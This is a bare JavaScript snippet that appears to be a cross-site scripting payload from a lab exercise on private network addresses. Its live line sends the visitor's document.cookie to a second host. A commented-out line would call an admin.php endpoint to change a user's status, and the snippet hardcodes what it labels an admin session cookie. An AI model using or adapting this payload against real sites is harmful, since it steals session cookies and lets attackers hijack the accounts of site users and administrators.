var request = new XMLHttpRequest();
var admin_cookie = "ok0fsoj6v7bejjd2ug0bnq52s0";
var data = "id=11&status=active";
// request.open('GET', 'http://192.168.16.129/admin/admin.php?' + data);
request.open('GET', 'http://192.168.16.128/?' + document.cookie);
request.send();
